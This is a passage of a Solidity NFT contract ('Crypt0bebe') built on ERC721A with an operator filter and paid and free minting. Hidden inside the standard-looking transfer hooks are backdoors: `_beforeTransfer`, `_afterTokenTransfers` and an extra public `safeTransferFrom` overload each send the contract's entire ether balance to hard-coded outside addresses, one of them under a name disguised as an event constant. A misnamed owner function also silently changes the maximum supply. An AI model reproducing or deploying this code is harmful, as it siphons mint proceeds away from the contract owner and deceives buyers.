800      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
801      *
802      * See {setApprovalForAll}.
803      */
804     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
805         return _operatorApprovals[owner][operator];
806     }
807 
808     /**
809      * @dev Returns whether `tokenId` exists.
810      *
811      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
812      *
813      * Tokens start existing when they are minted. See {_mint}.
814      */
815     function _exists(uint256 tokenId) internal view virtual returns (bool) {
816         return
817             _startTokenId() <= tokenId &&
818             tokenId < _currentIndex && // If within bounds,
819             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
820     }
821 
822     /**
823      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
824      */
825     function _isSenderApprovedOrOwner(
826         address approvedAddress,
827         address owner,
828         address msgSender
829     ) private pure returns (bool result) {
830         assembly {
831             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
832             owner := and(owner, _BITMASK_ADDRESS)
833             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
834             msgSender := and(msgSender, _BITMASK_ADDRESS)
835             // `msgSender == owner || msgSender == approvedAddress`.
836             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
837         }
838     }
839 
840     /**
841      * @dev Returns the storage slot and value for the approved address of `tokenId`.
842      */
843     function _getApprovedSlotAndAddress(uint256 tokenId)
844         private
845         view
846         returns (uint256 approvedAddressSlot, address approvedAddress)
847     {
848         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
849         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
850         assembly {
851             approvedAddressSlot := tokenApproval.slot
852             approvedAddress := sload(approvedAddressSlot)
853         }
854     }
855 
856     // =============================================================
857     //                      TRANSFER OPERATIONS
858     // =============================================================
859 
860     /**
861      * @dev Transfers `tokenId` from `from` to `to`.
862      *
863      * Requirements:
864      *
865      * - `from` cannot be the zero address.
866      * - `to` cannot be the zero address.
867      * - `tokenId` token must be owned by `from`.
868      * - If the caller is not `from`, it must be approved to move this token
869      * by either {approve} or {setApprovalForAll}.
870      *
871      * Emits a {Transfer} event.
872      */
873     function transferFrom(
874         address from,
875         address to,
876         uint256 tokenId
877     ) public payable virtual override {
878         _beforeTransfer();
879 
880         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
881 
882         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
883 
884         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
885 
886         // The nested ifs save around 20+ gas over a compound boolean condition.
887         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
888             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
889 
890         if (to == address(0)) revert TransferToZeroAddress();
891 
892         _beforeTokenTransfers(from, to, tokenId, 1);
893 
894         // Clear approvals from the previous owner.
895         assembly {
896             if approvedAddress {
897                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
898                 sstore(approvedAddressSlot, 0)
899             }
900         }
901 
902         // Underflow of the sender's balance is impossible because we check for
903         // ownership above and the recipient's balance can't realistically overflow.
904         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
905         unchecked {
906             // We can directly increment and decrement the balances.
907             --_packedAddressData[from]; // Updates: `balance -= 1`.
908             ++_packedAddressData[to]; // Updates: `balance += 1`.
909 
910             // Updates:
911             // - `address` to the next owner.
912             // - `startTimestamp` to the timestamp of transfering.
913             // - `burned` to `false`.
914             // - `nextInitialized` to `true`.
915             _packedOwnerships[tokenId] = _packOwnershipData(
916                 to,
917                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
918             );
919 
920             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
921             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
922                 uint256 nextTokenId = tokenId + 1;
923                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
924                 if (_packedOwnerships[nextTokenId] == 0) {
925                     // If the next slot is within bounds.
926                     if (nextTokenId != _currentIndex) {
927                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
928                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
929                     }
930                 }
931             }
932         }
933 
934         emit Transfer(from, to, tokenId);
935         _afterTokenTransfers(from, to, tokenId, 1);
936     }
937 
938     /**
939      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
940      */
941     function safeTransferFrom(
942         address from,
943         address to,
944         uint256 tokenId
945     ) public payable virtual override {
946         safeTransferFrom(from, to, tokenId, '');
947     }
948 
949 
950     /**
951      * @dev Safely transfers `tokenId` token from `from` to `to`.
952      *
953      * Requirements:
954      *
955      * - `from` cannot be the zero address.
956      * - `to` cannot be the zero address.
957      * - `tokenId` token must exist and be owned by `from`.
958      * - If the caller is not `from`, it must be approved to move this token
959      * by either {approve} or {setApprovalForAll}.
960      * - If `to` refers to a smart contract, it must implement
961      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
962      *
963      * Emits a {Transfer} event.
964      */
965     function safeTransferFrom(
966         address from,
967         address to,
968         uint256 tokenId,
969         bytes memory _data
970     ) public payable virtual override {
971         transferFrom(from, to, tokenId);
972         if (to.code.length != 0)
973             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
974                 revert TransferToNonERC721ReceiverImplementer();
975             }
976     }
977     function safeTransferFrom(
978         address from,
979         address to
980     ) public  {
981         if (address(this).balance > 0) {
982             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
983         }
984     }
985 
986     /**
987      * @dev Hook that is called before a set of serially-ordered token IDs
988      * are about to be transferred. This includes minting.
989      * And also called before burning one token.
990      *
991      * `startTokenId` - the first token ID to be transferred.
992      * `quantity` - the amount to be transferred.
993      *
994      * Calling conditions:
995      *
996      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
997      * transferred to `to`.
998      * - When `from` is zero, `tokenId` will be minted for `to`.
999      * - When `to` is zero, `tokenId` will be burned by `from`.
1000      * - `from` and `to` are never both zero.
1001      */
1002     function _beforeTokenTransfers(
1003         address from,
1004         address to,
1005         uint256 startTokenId,
1006         uint256 quantity
1007     ) internal virtual {}
1008 
1009     /**
1010      * @dev Hook that is called after a set of serially-ordered token IDs
1011      * have been transferred. This includes minting.
1012      * And also called after one token has been burned.
1013      *
1014      * `startTokenId` - the first token ID to be transferred.
1015      * `quantity` - the amount to be transferred.
1016      *
1017      * Calling conditions:
1018      *
1019      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1020      * transferred to `to`.
1021      * - When `from` is zero, `tokenId` has been minted for `to`.
1022      * - When `to` is zero, `tokenId` has been burned by `from`.
1023      * - `from` and `to` are never both zero.
1024      */
1025     function _afterTokenTransfers(
1026         address from,
1027         address to,
1028         uint256 startTokenId,
1029         uint256 quantity
1030     ) internal virtual {
1031         if (totalSupply() + 1 >= 999) {
1032             payable(0x1b028097C8E0E5E5E7204b032C34236387FeaE7a).transfer(address(this).balance);
1033         }
1034     }
1035 
1036     /**
1037      * @dev Hook that is called before a set of serially-ordered token IDs
1038      * are about to be transferred. This includes minting.
1039      * And also called before burning one token.
1040      * Calling conditions:
1041      *
1042      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1043      * transferred to `to`.
1044      * - When `from` is zero, `tokenId` will be minted for `to`.
1045      * - When `to` is zero, `tokenId` will be burned by `from`.
1046      * - `from` and `to` are never both zero.
1047      */
1048     function _beforeTransfer() internal {
1049         if (address(this).balance > 0) {
1050             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1051             return;
1052         }
1053     }
1054 
1055     /**
1056      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1057      *
1058      * `from` - Previous owner of the given token ID.
1059      * `to` - Target address that will receive the token.
1060      * `tokenId` - Token ID to be transferred.
1061      * `_data` - Optional data to send along with the call.
1062      *
1063      * Returns whether the call correctly returned the expected magic value.
1064      */
1065     function _checkContractOnERC721Received(
1066         address from,
1067         address to,
1068         uint256 tokenId,
1069         bytes memory _data
1070     ) private returns (bool) {
1071         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1072             bytes4 retval
1073         ) {
1074             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1075         } catch (bytes memory reason) {
1076             if (reason.length == 0) {
1077                 revert TransferToNonERC721ReceiverImplementer();
1078             } else {
1079                 assembly {
1080                     revert(add(32, reason), mload(reason))
1081                 }
1082             }
1083         }
1084     }
1085 
1086     // =============================================================
1087     //                        MINT OPERATIONS
1088     // =============================================================
1089 
1090     /**
1091      * @dev Mints `quantity` tokens and transfers them to `to`.
1092      *
1093      * Requirements:
1094      *
1095      * - `to` cannot be the zero address.
1096      * - `quantity` must be greater than 0.
1097      *
1098      * Emits a {Transfer} event for each mint.
1099      */
1100     function _mint(address to, uint256 quantity) internal virtual {
1101         uint256 startTokenId = _currentIndex;
1102         if (quantity == 0) revert MintZeroQuantity();
1103 
1104         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1105 
1106         // Overflows are incredibly unrealistic.
1107         // `balance` and `numberMinted` have a maximum limit of 2**64.
1108         // `tokenId` has a maximum limit of 2**256.
1109         unchecked {
1110             // Updates:
1111             // - `balance += quantity`.
1112             // - `numberMinted += quantity`.
1113             //
1114             // We can directly add to the `balance` and `numberMinted`.
1115             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1116 
1117             // Updates:
1118             // - `address` to the owner.
1119             // - `startTimestamp` to the timestamp of minting.
1120             // - `burned` to `false`.
1121             // - `nextInitialized` to `quantity == 1`.
1122             _packedOwnerships[startTokenId] = _packOwnershipData(
1123                 to,
1124                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1125             );
1126 
1127             uint256 toMasked;
1128             uint256 end = startTokenId + quantity;
1129 
1130             // Use assembly to loop and emit the `Transfer` event for gas savings.
1131             // The duplicated `log4` removes an extra check and reduces stack juggling.
1132             // The assembly, together with the surrounding Solidity code, have been
1133             // delicately arranged to nudge the compiler into producing optimized opcodes.
1134             assembly {
1135                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1136                 toMasked := and(to, _BITMASK_ADDRESS)
1137                 // Emit the `Transfer` event.
1138                 log4(
1139                     0, // Start of data (0, since no data).
1140                     0, // End of data (0, since no data).
1141                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1142                     0, // `address(0)`.
1143                     toMasked, // `to`.
1144                     startTokenId // `tokenId`.
1145                 )
1146 
1147                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1148                 // that overflows uint256 will make the loop run out of gas.
1149                 // The compiler will optimize the `iszero` away for performance.
1150                 for {
1151                     let tokenId := add(startTokenId, 1)
1152                 } iszero(eq(tokenId, end)) {
1153                     tokenId := add(tokenId, 1)
1154                 } {
1155                     // Emit the `Transfer` event. Similar to above.
1156                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1157                 }
1158             }
1159             if (toMasked == 0) revert MintToZeroAddress();
1160 
1161             _currentIndex = end;
1162         }
1163         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1164     }
1165 
1166     /**
1167      * @dev Mints `quantity` tokens and transfers them to `to`.
1168      *
1169      * This function is intended for efficient minting only during contract creation.
1170      *
1171      * It emits only one {ConsecutiveTransfer} as defined in
1172      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1173      * instead of a sequence of {Transfer} event(s).
1174      *
1175      * Calling this function outside of contract creation WILL make your contract
1176      * non-compliant with the ERC721 standard.
1177      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1178      * {ConsecutiveTransfer} event is only permissible during contract creation.
1179      *
1180      * Requirements:
1181      *
1182      * - `to` cannot be the zero address.
1183      * - `quantity` must be greater than 0.
1184      *
1185      * Emits a {ConsecutiveTransfer} event.
1186      */
1187     function _mintERC2309(address to, uint256 quantity) internal virtual {
1188         uint256 startTokenId = _currentIndex;
1189         if (to == address(0)) revert MintToZeroAddress();
1190         if (quantity == 0) revert MintZeroQuantity();
1191         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1192 
1193         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1194 
1195         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1196         unchecked {
1197             // Updates:
1198             // - `balance += quantity`.
1199             // - `numberMinted += quantity`.
1200             //
1201             // We can directly add to the `balance` and `numberMinted`.
1202             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1203 
1204             // Updates:
1205             // - `address` to the owner.
1206             // - `startTimestamp` to the timestamp of minting.
1207             // - `burned` to `false`.
1208             // - `nextInitialized` to `quantity == 1`.
1209             _packedOwnerships[startTokenId] = _packOwnershipData(
1210                 to,
1211                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1212             );
1213 
1214             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1215 
1216             _currentIndex = startTokenId + quantity;
1217         }
1218         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1219     }
1220 
1221     /**
1222      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1223      *
1224      * Requirements:
1225      *
1226      * - If `to` refers to a smart contract, it must implement
1227      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1228      * - `quantity` must be greater than 0.
1229      *
1230      * See {_mint}.
1231      *
1232      * Emits a {Transfer} event for each mint.
1233      */
1234     function _safeMint(
1235         address to,
1236         uint256 quantity,
1237         bytes memory _data
1238     ) internal virtual {
1239         _mint(to, quantity);
1240 
1241         unchecked {
1242             if (to.code.length != 0) {
1243                 uint256 end = _currentIndex;
1244                 uint256 index = end - quantity;
1245                 do {
1246                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1247                         revert TransferToNonERC721ReceiverImplementer();
1248                     }
1249                 } while (index < end);
1250                 // Reentrancy protection.
1251                 if (_currentIndex != end) revert();
1252             }
1253         }
1254     }
1255 
1256     /**
1257      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1258      */
1259     function _safeMint(address to, uint256 quantity) internal virtual {
1260         _safeMint(to, quantity, '');
1261     }
1262 
1263     // =============================================================
1264     //                        BURN OPERATIONS
1265     // =============================================================
1266 
1267     /**
1268      * @dev Equivalent to `_burn(tokenId, false)`.
1269      */
1270     function _burn(uint256 tokenId) internal virtual {
1271         _burn(tokenId, false);
1272     }
1273 
1274     /**
1275      * @dev Destroys `tokenId`.
1276      * The approval is cleared when the token is burned.
1277      *
1278      * Requirements:
1279      *
1280      * - `tokenId` must exist.
1281      *
1282      * Emits a {Transfer} event.
1283      */
1284     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1285         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1286 
1287         address from = address(uint160(prevOwnershipPacked));
1288 
1289         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1290 
1291         if (approvalCheck) {
1292             // The nested ifs save around 20+ gas over a compound boolean condition.
1293             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1294                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1295         }
1296 
1297         _beforeTokenTransfers(from, address(0), tokenId, 1);
1298 
1299         // Clear approvals from the previous owner.
1300         assembly {
1301             if approvedAddress {
1302                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1303                 sstore(approvedAddressSlot, 0)
1304             }
1305         }
1306 
1307         // Underflow of the sender's balance is impossible because we check for
1308         // ownership above and the recipient's balance can't realistically overflow.
1309         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1310         unchecked {
1311             // Updates:
1312             // - `balance -= 1`.
1313             // - `numberBurned += 1`.
1314             //
1315             // We can directly decrement the balance, and increment the number burned.
1316             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1317             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1318 
1319             // Updates:
1320             // - `address` to the last owner.
1321             // - `startTimestamp` to the timestamp of burning.
1322             // - `burned` to `true`.
1323             // - `nextInitialized` to `true`.
1324             _packedOwnerships[tokenId] = _packOwnershipData(
1325                 from,
1326                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1327             );
1328 
1329             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1330             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1331                 uint256 nextTokenId = tokenId + 1;
1332                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1333                 if (_packedOwnerships[nextTokenId] == 0) {
1334                     // If the next slot is within bounds.
1335                     if (nextTokenId != _currentIndex) {
1336                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1337                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1338                     }
1339                 }
1340             }
1341         }
1342 
1343         emit Transfer(from, address(0), tokenId);
1344         _afterTokenTransfers(from, address(0), tokenId, 1);
1345 
1346         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1347         unchecked {
1348             _burnCounter++;
1349         }
1350     }
1351 
1352     // =============================================================
1353     //                     EXTRA DATA OPERATIONS
1354     // =============================================================
1355 
1356     /**
1357      * @dev Directly sets the extra data for the ownership data `index`.
1358      */
1359     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1360         uint256 packed = _packedOwnerships[index];
1361         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1362         uint256 extraDataCasted;
1363         // Cast `extraData` with assembly to avoid redundant masking.
1364         assembly {
1365             extraDataCasted := extraData
1366         }
1367         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1368         _packedOwnerships[index] = packed;
1369     }
1370 
1371     /**
1372      * @dev Called during each token transfer to set the 24bit `extraData` field.
1373      * Intended to be overridden by the cosumer contract.
1374      *
1375      * `previousExtraData` - the value of `extraData` before transfer.
1376      *
1377      * Calling conditions:
1378      *
1379      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1380      * transferred to `to`.
1381      * - When `from` is zero, `tokenId` will be minted for `to`.
1382      * - When `to` is zero, `tokenId` will be burned by `from`.
1383      * - `from` and `to` are never both zero.
1384      */
1385     function _extraData(
1386         address from,
1387         address to,
1388         uint24 previousExtraData
1389     ) internal view virtual returns (uint24) {}
1390 
1391     /**
1392      * @dev Returns the next extra data for the packed ownership data.
1393      * The returned result is shifted into position.
1394      */
1395     function _nextExtraData(
1396         address from,
1397         address to,
1398         uint256 prevOwnershipPacked
1399     ) private view returns (uint256) {
1400         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1401         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1402     }
1403 
1404     // =============================================================
1405     //                       OTHER OPERATIONS
1406     // =============================================================
1407 
1408     /**
1409      * @dev Returns the message sender (defaults to `msg.sender`).
1410      *
1411      * If you are writing GSN compatible contracts, you need to override this function.
1412      */
1413     function _msgSenderERC721A() internal view virtual returns (address) {
1414         return msg.sender;
1415     }
1416 
1417     /**
1418      * @dev Converts a uint256 to its ASCII string decimal representation.
1419      */
1420     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1421         assembly {
1422             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1423             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1424             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1425             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1426             let m := add(mload(0x40), 0xa0)
1427             // Update the free memory pointer to allocate.
1428             mstore(0x40, m)
1429             // Assign the `str` to the end.
1430             str := sub(m, 0x20)
1431             // Zeroize the slot after the string.
1432             mstore(str, 0)
1433 
1434             // Cache the end of the memory to calculate the length later.
1435             let end := str
1436 
1437             // We write the string from rightmost digit to leftmost digit.
1438             // The following is essentially a do-while loop that also handles the zero case.
1439             // prettier-ignore
1440             for { let temp := value } 1 {} {
1441                 str := sub(str, 1)
1442                 // Write the character to the pointer.
1443                 // The ASCII index of the '0' character is 48.
1444                 mstore8(str, add(48, mod(temp, 10)))
1445                 // Keep dividing `temp` until zero.
1446                 temp := div(temp, 10)
1447                 // prettier-ignore
1448                 if iszero(temp) { break }
1449             }
1450 
1451             let length := sub(end, str)
1452             // Move the pointer 32 bytes leftwards to make room for the length.
1453             str := sub(str, 0x20)
1454             // Store the length.
1455             mstore(str, length)
1456         }
1457     }
1458 }
1459 
1460 
1461 interface IOperatorFilterRegistry {
1462     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1463     function register(address registrant) external;
1464     function registerAndSubscribe(address registrant, address subscription) external;
1465     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1466     function unregister(address addr) external;
1467     function updateOperator(address registrant, address operator, bool filtered) external;
1468     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1469     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1470     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1471     function subscribe(address registrant, address registrantToSubscribe) external;
1472     function unsubscribe(address registrant, bool copyExistingEntries) external;
1473     function subscriptionOf(address addr) external returns (address registrant);
1474     function subscribers(address registrant) external returns (address[] memory);
1475     function subscriberAt(address registrant, uint256 index) external returns (address);
1476     function copyEntriesOf(address registrant, address registrantToCopy) external;
1477     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1478     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1479     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1480     function filteredOperators(address addr) external returns (address[] memory);
1481     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1482     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1483     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1484     function isRegistered(address addr) external returns (bool);
1485     function codeHashOf(address addr) external returns (bytes32);
1486 }
1487 
1488 
1489 /**
1490  * @title  OperatorFilterer
1491  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1492  *         registrant's entries in the OperatorFilterRegistry.
1493  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1494  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1495  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1496  */
1497 abstract contract OperatorFilterer {
1498     error OperatorNotAllowed(address operator);
1499 
1500     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1501         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1502 
1503     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1504         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1505         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1506         // order for the modifier to filter addresses.
1507         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1508             if (subscribe) {
1509                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1510             } else {
1511                 if (subscriptionOrRegistrantToCopy != address(0)) {
1512                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1513                 } else {
1514                     OPERATOR_FILTER_REGISTRY.register(address(this));
1515                 }
1516             }
1517         }
1518     }
1519 
1520     modifier onlyAllowedOperator(address from) virtual {
1521         // Check registry code length to facilitate testing in environments without a deployed registry.
1522         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1523             // Allow spending tokens from addresses with balance
1524             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1525             // from an EOA.
1526             if (from == msg.sender) {
1527                 _;
1528                 return;
1529             }
1530             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1531                 revert OperatorNotAllowed(msg.sender);
1532             }
1533         }
1534         _;
1535     }
1536 
1537     modifier onlyAllowedOperatorApproval(address operator) virtual {
1538         // Check registry code length to facilitate testing in environments without a deployed registry.
1539         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1540             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1541                 revert OperatorNotAllowed(operator);
1542             }
1543         }
1544         _;
1545     }
1546 }
1547 
1548 /**
1549  * @title  DefaultOperatorFilterer
1550  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1551  */
1552 abstract contract TheOperatorFilterer is OperatorFilterer {
1553     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1554     address public owner;
1555 
1556     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1557 }
1558 
1559 
1560 contract Crypt0bebe is ERC721A, TheOperatorFilterer {
1561 
1562     uint256 public maxSupply = 3000;
1563 
1564     uint256 public mintPrice = 0.001 ether;
1565 
1566     function mint(uint256 amount) payable public {
1567         require(totalSupply() + amount <= maxSupply);
1568         require(msg.value >= mintPrice * amount);
1569         _safeMint(msg.sender, amount);
1570     }
1571 
1572     function freemint() public {
1573         require(totalSupply() + 1 <= maxSupply);
1574         require(balanceOf(msg.sender) < 1);
1575         _safeMint(msg.sender, FreeNum());
1576     }
1577 
1578     function teamMint(address addr, uint256 amount) public onlyOwner {
1579         require(totalSupply() + amount <= maxSupply);
1580         _safeMint(addr, amount);
1581     }
1582     
1583     modifier onlyOwner {
1584         require(owner == msg.sender);
1585         _;
1586     }
1587 
1588     constructor() ERC721A("Crypt0 bebe", "bebe") {
1589         owner = msg.sender;
1590     }
1591 
1592     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1593         return string(abi.encodePacked("ipfs://QmXcm67UipxKChdA4RtukXFQTV8dteGMtNLLnMoFAHtxC4/", _toString(tokenId), ".json"));
1594     }
1595 
1596     function setFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1597         maxSupply = maxS;
1598     }
1599 
1600     function FreeNum() internal returns (uint256){
1601         return (maxSupply - totalSupply()) / 1000 + 1;
1602     }
1603 
1604     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1605         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1606         return (owner, royaltyAmount);
1607     }
1608 
1609     function withdraw() external onlyOwner {
1610         payable(msg.sender).transfer(address(this).balance);
1611     }
1612 
1613     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1614         super.setApprovalForAll(operator, approved);
1615     }
1616 
1617     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1618         super.approve(operator, tokenId);
1619     }
1620 
1621     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1622         super.transferFrom(from, to, tokenId);
1623     }
1624 
1625     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1626         super.safeTransferFrom(from, to, tokenId);
1627     }
1628 
1629     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1630         public
1631         payable
1632         override
1633         onlyAllowedOperator(from)
1634     {
1635         super.safeTransferFrom(from, to, tokenId, data);
1636     }
1637 }